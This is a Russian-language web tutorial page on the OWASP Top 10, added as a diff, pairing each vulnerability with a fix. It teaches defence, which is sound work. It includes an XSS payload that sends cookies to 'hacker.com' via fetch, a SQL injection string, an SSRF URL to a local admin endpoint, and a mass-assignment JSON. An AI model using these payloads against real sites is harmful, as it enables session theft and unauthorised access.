@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>11.3 OWASP Top 10 — ScaleTrade</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="book-layout">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <a href="index.html" class="logo">
+                    <div class="logo-icon">📈</div>
+                    <span>ScaleTrade</span>
+                </a>
+            </div>
+            <nav class="sidebar-nav">
+                <div class="nav-section">
+                    <div class="nav-section-title">Введение</div>
+                    <a href="index.html" class="nav-link">🏠 Главная</a>
+                </div>
+                <div class="nav-section">
+                    <div class="nav-section-title">Часть 11: Security</div>
+                    <a href="part11_oauth.html" class="nav-link">11.1 OAuth2 & JWT</a>
+                    <a href="part11_vault.html" class="nav-link">11.2 HashiCorp Vault</a>
+                    <a href="part11_owasp.html" class="nav-link active">11.3 OWASP Top 10</a>
+                </div>
+            </nav>
+        </aside>
+
+        <main class="main-content">
+            <header class="header">
+                <div class="breadcrumb">
+                    <a href="index.html">ScaleTrade</a>
+                    <span>/</span>
+                    <span>Часть 11</span>
+                    <span>/</span>
+                    <span>11.3 OWASP</span>
+                </div>
+            </header>
+
+            <div class="page-content">
+                <h1>Модуль 11.3: OWASP Top 10</h1>
+                <p class="lead">Десять самых популярных способов взломать ваше приложение. Если вы не знаете их, вас взломают.</p>
+
+                <h2>1. Broken Access Control</h2>
+                <p>Лидер рейтинга. "Я поменял ID в URL с <code>/orders/1</code> на <code>/orders/2</code> и увидел чужой заказ".</p>
+                <p><strong>Защита:</strong> В каждой ручке проверять владельца.</p>
+<pre><code class="language-python"># Плохо
+@get("/orders/{id}")
+async def get_order(id: int):
+    return repo.get(id)
+
+# Хорошо
+@get("/orders/{id}")
+async def get_order(id: int, user: User):
+    order = repo.get(id)
+    if order.user_id != user.id:
+        raise ForbiddenException()
+    return order
+</code></pre>
+
+                <h2>2. Injection (SQL, NoSQL, Command)</h2>
+                <p>Внедрение вредоносного кода через недоверенные данные.</p>
+                <p><strong>SQL Injection:</strong> <code>SELECT * FROM users WHERE name = '' OR '1'='1'</code></p>
+                <p><strong>Защита:</strong> Использовать ORM (SQLAlchemy) или параметризованные запросы. НИКОГДА не форматировать строки для SQL (`f"SELECT ... {var}"`).</p>
+
+                <h2>3. Cross-Site Scripting (XSS)</h2>
+                <p>Злоумышленник внедряет JS скрипт на страницу, который крадет куки пользователей.</p>
+                <p>Пример: в комменте написать <code>&lt;script&gt;fetch('hacker.com?cookie='+document.cookie)&lt;/script&gt;</code>.</p>
+                <p><strong>Защита:</strong> React/Vue экранируют всё по умолчанию. Не используйте <code>dangerouslySetInnerHTML</code>.</p>
+
+                <h2>SSRF (Server-Side Request Forgery)</h2>
+                <p>Заставляем сервер сделать запрос во внутреннюю сеть.</p>
+                <p>Хакер: "Загрузи аватарку по URL: <code>http://localhost:8080/admin/delete_db</code>". Сервер, если запущен с правами, выполнит это.</p>
+
+                <h2>Security Headers</h2>
+                <p>Простые заголовки, которые усложняют жизнь хакерам.</p>
+                <ul>
+                    <li><code>Content-Security-Policy (CSP):</code> Можно загружать скрипты только с trusted.com.</li>
+                    <li><code>X-Content-Type-Options: nosniff:</code> Запрещает браузеру "угадывать" тип файла (защита от XSS в картинках).</li>
+                    <li><code>Strict-Transport-Security (HSTS):</code> Только HTTPS.</li>
+                </ul>
+
+                <h2>🪨 Подводные камни</h2>
+                <div class="accordion">
+                    <div class="accordion-item">
+                        <div class="accordion-header">
+                            <strong>1. XML External Entities (XXE)</strong>
+                        </div>
+                        <div class="accordion-content">
+                            <p>Если вы парсите XML (например, старая интеграция), дефолтные парсеры Python (`lxml`, `minidom`) уязвимы. Хакер может послать XML, который заставит сервер прочитать файл `/etc/passwd`. Всегда отключайте DTD processing: <code>resolve_entities=False</code>.</p>
+                        </div>
+                    </div>
+                    <div class="accordion-item">
+                        <div class="accordion-header">
+                            <strong>2. Mass Assignment</strong>
+                        </div>
+                        <div class="accordion-content">
+                            <p>Пользователь шлет JSON <code>{"is_admin": true, "name": "Hack"}</code>. Если вы делаете `User.objects.create(**data)`, вы только что создали админа. Всегда используйте Pydantic / DTO, чтобы фильтровать входные поля.</p>
+                        </div>
+                    </div>
+                    <div class="accordion-item">
+                        <div class="accordion-header">
+                            <strong>3. Pickle & YAML Deserialization</strong>
+                        </div>
+                        <div class="accordion-content">
+                            <p>Никогда не десериализуйте данные от пользователя через `pickle.loads()` или `yaml.load()`. Это Arbitrary Code Execution (RCE). Используйте только JSON или `yaml.safe_load()`.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <h2>💡 Лайфхаки</h2>
+                <ul>
+                    <li><strong>Bandit:</strong> Линтер для безопасности Python кода. Найдет `exec()`, `assert` в проде, жестко закодированные пароли. Включите его в CI pipeline.</li>
+                    <li><strong>Pip Audit:</strong> Встроенная в Python проверка зависимостей. <code>pip-audit</code> проверяет ваш environment на наличие пакетов с известными CVE.</li>
+                    <li><strong>Kopylot / Snyk:</strong> Используйте бесплатные сканеры для репозитория. Они найдут уязвимости в Docker-образах и библиотеках раньше хакеров.</li>
+                </ul>
+
+                <div class="task-box">
+                    <h4>🎯 Практика</h4>
+                    <ul class="task-list">
+                        <li>Просканируй проект утилитой <code>bandit</code></li>
+                        <li>Найди и используй уязвимость IDOR в своем API (поменяй ID ресурса)</li>
+                        <li>Настрой Content-Security-Policy (CSP) для фронтенда</li>
+                        <li>Напиши тест, проверяющий отсутствие Mass Assignment</li>
+                    </ul>
+                </div>
+            </div>
+        </main>
+    </div>
+</body>
+</html>
